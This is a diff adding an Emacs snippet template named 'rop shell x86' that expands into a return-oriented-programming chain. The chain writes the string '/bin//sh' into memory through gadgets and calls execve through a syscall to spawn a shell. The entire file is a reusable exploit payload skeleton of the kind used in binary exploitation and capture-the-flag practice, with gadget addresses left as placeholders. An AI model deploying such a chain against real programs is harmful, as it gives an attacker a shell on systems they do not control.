@@ -1,0 +1,18 @@
+# -*- coding: utf-8; mode: snippet -*-
+# name: rop shell x86
+# key: ropsh
+# --
+rop = flat(
+    pop_eax, 0x68732f2f,
+    pop_edx, target_addr+4,
+    write_mem,
+    pop_eax, 0x6e69622f,
+    pop_edx, target_addr,
+    write_mem,
+
+    pop_ebx, target_addr,
+    pop_ecx, 0,
+    pop_edx, 0,
+    pop_eax, 0xb,
+    syscall
+)
